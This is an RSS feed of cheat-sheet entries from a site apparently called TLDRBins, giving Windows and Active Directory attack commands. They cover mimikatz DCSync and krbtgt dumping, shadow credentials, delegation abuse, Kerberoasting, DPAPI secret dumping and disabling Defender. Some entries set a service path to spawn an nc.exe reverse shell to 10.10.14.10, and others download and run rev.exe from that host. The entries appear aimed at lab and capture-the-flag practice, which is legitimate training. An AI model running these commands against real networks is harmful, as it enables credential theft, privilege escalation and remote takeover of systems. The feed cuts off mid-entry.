<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Windows on TLDRBins</title>
    <link>https://tldrbins.github.io/@windows/</link>
    <description>Recent content in Windows on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@windows/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Abuse Parent Child Domain Trusts</title>
      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain ./mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
    </item>
    <item>
      <title>Account Operators</title>
      <link>https://tldrbins.github.io/account_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/account_operators/</guid>
      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create new user password object $new_user_password = ConvertTo-SecureString &amp;lt;NEW_USER_PASSWORD&amp;gt; -AsPlainText -Force 4. Create new user account # Create a new user New-AdUser &amp;lt;NEW_USER&amp;gt; -enabled $true -accountpassword $new_user_password -Credential $cred # Grant new user privilege (e.</description>
    </item>
    <item>
      <title>AD Recycle Bin</title>
      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
      <description> Privesc #1: Restore deleted AD account 1. Import AD module import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq &amp;#34;&amp;lt;DELETED_USER&amp;gt;&amp;#34; } -includeDeletedObjects -property * 4. Restore deleted account # Rename the target account to avoid user exist error Restore-ADObject -Identity &amp;lt;ObjectGUID&amp;gt; -NewName &amp;lt;NEW_USER&amp;gt; -TargetPath &amp;#34;CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#34; </description>
    </item>
    <item>
      <title>ADCS</title>
      <link>https://tldrbins.github.io/adcs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adcs/</guid>
      <description>Enum (From Linux) certipy-ad certipy-ad find -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M adcs Enum (From Windows) Powershell # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates Certify.exe # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser ADCSTemplate ADCSTemplate&#xA;import-module .</description>
    </item>
    <item>
      <title>AddKeyCredentialLink</title>
      <link>https://tldrbins.github.io/addkeycredentiallink/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addkeycredentiallink/</guid>
      <description>Privesc #1: Shadow credentials (From Linux) pywhisker&#xA;0. Pre-check [optional] python3 pywhisker.py --action list -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;CURRENT_USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --dc-ip &amp;lt;DC&amp;gt; -t &amp;lt;TARGET_USER&amp;gt; --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;CURRENT_USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --dc-ip &amp;lt;DC&amp;gt; -t &amp;lt;TARGET_USER&amp;gt; --use-ldaps # Fix module &amp;#39;OpenSSL.crypto&amp;#39; has no attribute &amp;#39;PKCS12Type&amp;#39; pip3 install -I pyopenssl==24.0.0 2. Request TGT using PFX file PKINITtools&#xA;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; python3 gettgtpkinit.</description>
    </item>
    <item>
      <title>AddSelf</title>
      <link>https://tldrbins.github.io/addself/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addself/</guid>
      <description>Privesc #1: Add self to group (From Linux) powerview.py powerview.py&#xA;# Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; # Add self to group Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USERNAME&amp;gt; # Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity &amp;lt;ANOTHER_GROUP&amp;gt; -PrincipalIdentity &amp;lt;USERNAME&amp;gt; -Rights fullcontrol # Check Get-DomainObjectAcl -Identity &amp;lt;TARGET_USER_IN_ANOTHER_GROUP&amp;gt; -Where &amp;#34;SecurityIdentifier contains &amp;lt;USERNAME&amp;gt;&amp;#34; bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;TARGET_GROUP&amp;gt; &amp;lt;USERNAME&amp;gt; # After getting full control of target group (e.</description>
    </item>
    <item>
      <title>AllowedToDelegate</title>
      <link>https://tldrbins.github.io/allowedtodelegate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
      <description>Privesc #1: Forge a Ticket (From Linux) # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -dc-ip &amp;lt;DC_IP&amp;gt; -spn www/dc.example.com -hashes :&amp;lt;HASH&amp;gt; -impersonate Administrator &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; # Export ccache export KRB5CCNAME=Administrator.ccache # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; wmiexec.py -k -no-pass administrator@dc.example.com Note: impacket-wmiexec may not work</description>
    </item>
    <item>
      <title>Alternate Data Stream</title>
      <link>https://tldrbins.github.io/alternate_data_stream/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/alternate_data_stream/</guid>
      <description> Show ADS # cmd cmd /C dir /R \Windows\Tasks\example.txt # powershell Get-Item -Path \Windows\Tasks\example.txt -force -stream * </description>
    </item>
    <item>
      <title>Bloodhound</title>
      <link>https://tldrbins.github.io/bloodhound/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/bloodhound/</guid>
      <description>sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all bloodhound-python # With Creds bloodhound-python -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip # With Kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; bloodhound-python -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -k -d &amp;lt;DOMAIN&amp;gt; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip bloodhound with PKI support BloodHound&#xA;# Fix: GPU process isn&amp;#39;t usable. Goodbye.</description>
    </item>
    <item>
      <title>Built-in Group</title>
      <link>https://tldrbins.github.io/built-in_group/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/built-in_group/</guid>
      <description> Abuse #1. Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 # Assumed nc.exe is uploaded sc.exe config VSS binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd 10.10.14.10 443&amp;#34; # Stop service sc.exe stop VSS # Start service sc.exe start VSS </description>
    </item>
    <item>
      <title>Bypass ASMI</title>
      <link>https://tldrbins.github.io/bypas_asmi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/bypas_asmi/</guid>
      <description>Payloads Amsi-Bypass-Payloads&#xA;evil-winrm menu Bypass-4MSI Note: have to run menu first</description>
    </item>
    <item>
      <title>Compressed Files</title>
      <link>https://tldrbins.github.io/compressed_files/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/compressed_files/</guid>
      <description>Hint: Always put the zip file inside a new folder before unzip&#xA;zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # zip a symlink (not the destination file) zip --symlinks file.zip symlink # List files without unzip unzip -l file.zip # unzip unzip file.zip # unzip (Windows) Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;C:\ProgramData\file.zip&amp;#39;, &amp;#39;C:\ProgramData\&amp;#39;) tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.</description>
    </item>
    <item>
      <title>Constrained Delegation</title>
      <link>https://tldrbins.github.io/constrained_delegation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
      <description>Abuse #1: RBCD Attack 1. Find delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check forwardable flag describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache 2. RBCD # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USERNAME&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k # Impersonate impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate &amp;lt;TARGET_2&amp;gt; # Check forwardable flag describeTicket.</description>
    </item>
    <item>
      <title>Cross Session Relay</title>
      <link>https://tldrbins.github.io/cross_session_relay/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/cross_session_relay/</guid>
      <description> Display information about the session host qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 RemotePotato0&#xA;# In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.10:9999 # Trigger Attack .\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x 10.10.14.10 -p 9999 KrbRelay KrbRelay&#xA;.\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 &amp;#34;C:\ProgramData\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&amp;#34; </description>
    </item>
    <item>
      <title>Defender (Windows)</title>
      <link>https://tldrbins.github.io/windows_defender/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/windows_defender/</guid>
      <description> Disable defender # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path &amp;#34;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&amp;#34; -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force </description>
    </item>
    <item>
      <title>dotnet</title>
      <link>https://tldrbins.github.io/dotnet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/dotnet/</guid>
      <description> Compile C# project (From Linux) Download dotnet&#xA;# Check dotnet --info # Prepare mkdir &amp;lt;PROJECT_NAME&amp;gt; cd &amp;lt;PROJECT_NAME&amp;gt; # Init dotnet new console # Create .sln file dotnet new sln # Link .sln to .csproj dotnet sln &amp;lt;PROJECT_NAME&amp;gt;.sln add &amp;lt;PROJECT_NAME&amp;gt;.csproj # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Build solution dotnet build # Run dotnet run </description>
    </item>
    <item>
      <title>DPAPI</title>
      <link>https://tldrbins.github.io/dpapi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/dpapi/</guid>
      <description>Abuse #1: Auto dump (From Linux) DonPAPI&#xA;DonPAPI collect -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -t &amp;lt;TARGET&amp;gt; Abuse #1: Auto dump (From Windows - mimikatz) 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Secrets Dump mimikatz.exe &amp;#34;token::elevate&amp;#34; &amp;#34;!+&amp;#34; &amp;#34;!processprotect /process:lsass.exe /remove&amp;#34; &amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::masterkey /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;PROTECT_HASH&amp;gt; /sid:&amp;lt;SID&amp;gt; /password:&amp;lt;PASSWORD&amp;gt; /protected&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#34;exit&amp;#34; Abuse #1: Auto dump (From Windows - SharpDPAPI.</description>
    </item>
    <item>
      <title>evil-winrm</title>
      <link>https://tldrbins.github.io/evil-winrm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/evil-winrm/</guid>
      <description> Connect by password evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; Connect by hash evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; Connect by kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; evil-winrm -i &amp;lt;TARGET&amp;gt; -r &amp;lt;DOMAIN&amp;gt; Connect by .crt and .key evil-winrm -i &amp;lt;TARGET&amp;gt; -S -k auth.key -c auth.crt </description>
    </item>
    <item>
      <title>ExecuteDCOM</title>
      <link>https://tldrbins.github.io/executedcom/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/executedcom/</guid>
      <description> Abuse #1: ExecuteDCOM (From Linux) # Revshell impacket-dcomexec &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; &amp;#39;&amp;lt;powershell #3 Base64&amp;gt;&amp;#39; -silentcommand -object MMC20 </description>
    </item>
    <item>
      <title>File Transfer (Linux to Windows)</title>
      <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
      <description>HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe &amp;amp;&amp;amp; C:\ProgramData\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: PowerShell 3.0+&#xA;# Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: curl is not always available</description>
    </item>
    <item>
      <title>File Transfer (Windows To Linux)</title>
      <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:&amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # From target Windows to local Linux copy example.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\example.txt example.txt # Delete file del example.txt # Remove SMB share net use /d \\10.10.14.10\share # Older Windows (e.</description>
    </item>
    <item>
      <title>Find (Windows)</title>
      <link>https://tldrbins.github.io/find_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/find_windows/</guid>
      <description> Show hidden files Get-ChildItem -force Find a file ls -path \Users -Filter example.txt -recurse -erroraction silent where /R C:\Users example.txt Find a file, with rules dir /s /b /a:-d-h \Users\Administrator | findstr /i /v &amp;#34;appdata&amp;#34; +---------------------------------------+ |dir: | |/s : include subfolders | |/b : bare format | |/a:-d-h : exclude directories or hidden| | | |findstr: | |/i : case insensitive | |/v appdata : exclude &amp;#39;appdata&amp;#39; | +---------------------------------------+ </description>
    </item>
    <item>
      <title>Firewall (Windows)</title>
      <link>https://tldrbins.github.io/firewall_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/firewall_windows/</guid>
      <description> Check Firewall Rules # cmd cmd /c &amp;#34;netsh advfirewall firewall show rule name=all|findstr Name:&amp;#34; # powershell Get-NetFirewallProfile # Check outbound rules Get-NetFirewallRule -Direction Outbound -Enabled True # Pretty Print powershell -c &amp;#34;Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name=&amp;#39;Protocol&amp;#39;;Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name=&amp;#39;LocalPort&amp;#39;;Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name=&amp;#39;RemotePort&amp;#39;;Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name=&amp;#39;RemoteAddress&amp;#39;;Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action&amp;#34; Add Inbound Rules # Allow all inbound traffic from local subnet New-NetFirewallRule -DisplayName &amp;#34;Allow All&amp;#34; -Direction Inbound -Enabled True -RemoteAddress LocalSubnet -Action Allow -Protocol TCP -Profile ANY </description>
    </item>
    <item>
      <title>ForceChangePassword</title>
      <link>https://tldrbins.github.io/forcechangepassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/forcechangepassword/</guid>
      <description> Abuse #1a: Change target user password 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change Target User Password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #1b: Change target user password 1. Via rpcclient rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;setuserinfo2 &amp;lt;TARGET_USER&amp;gt; 23 &amp;lt;TARGET_USER_NEW_PASSWORD&amp;gt;&amp;#39; </description>
    </item>
    <item>
      <title>GenericAll</title>
      <link>https://tldrbins.github.io/genericall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericall/</guid>
      <description>Abuse #1: Change target user password (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #1: Change target user password (From Linux) bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Abuse #2: Get shadow credentials (From Linux) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; certipy-ad shadow auto -username &amp;lt;USERNAME&amp;gt;@&amp;lt;DOMAIN&amp;gt; -password &amp;lt;PASSWORD&amp;gt; -k -account &amp;lt;TARGET_USER&amp;gt; -target &amp;lt;DC&amp;gt; Abuse #3 : Add user to group (From Windows) 1.</description>
    </item>
    <item>
      <title>GenericWrite</title>
      <link>https://tldrbins.github.io/genericwrite/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericwrite/</guid>
      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user 1. Import PowerView.ps1 . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
    </item>
    <item>
      <title>GetChanges/GetChangesAll</title>
      <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
      <description> Abuse #1: DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; # With hashes impacket-secretsdump -hashes &amp;lt;LM&amp;gt;:&amp;lt;NT&amp;gt; -just-dc &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; Abuse #1: DCSync Attack (From Windows) .\mimikatz.exe &amp;#39;lsadump::dcsync /domain:&amp;lt;DOMAIN&amp;gt; /user:administrator&amp;#39; exit </description>
    </item>
    <item>
      <title>GPOs</title>
      <link>https://tldrbins.github.io/gpos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/gpos/</guid>
      <description> Abuse #1: Add local admin SharpGPOAbuse&#xA;1. List GPOs Name Get-GPO -All | Select-Object DisplayName 2. Add localAdmin .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &amp;lt;USER&amp;gt; --GPOName &amp;lt;GPO_NAME&amp;gt; 3. Force reload gpupdate /force </description>
    </item>
    <item>
      <title>Host a SMB Server</title>
      <link>https://tldrbins.github.io/smb_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/smb_server/</guid>
      <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username &amp;lt;USER&amp;gt; -password &amp;lt;PASSWORD&amp;gt; Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
    </item>
    <item>
      <title>IIS</title>
      <link>https://tldrbins.github.io/iis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/iis/</guid>
      <description>IIS Version +---------------------------------------------------------------------------------+ | Version Start Date End Date | +---------------------------------------------------------------------------------+ | IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | | IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | | IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027 | | IIS 10 on Windows 10 Pro Jul 29, 2015 | | IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | | IIS 8.</description>
    </item>
    <item>
      <title>Kerberoasting</title>
      <link>https://tldrbins.github.io/roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/roasting/</guid>
      <description>AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile usernames.txt -no-pass -dc-ip &amp;lt;DC&amp;gt; # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; Kerberoasting From Linux # Fix time skew sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -no-preauth &amp;lt;USER_WITH_DONT_REQUIRE_PREAUTH&amp;gt; -usersfile usernames.</description>
    </item>
    <item>
      <title>Kerberos</title>
      <link>https://tldrbins.github.io/kerberos/</link>
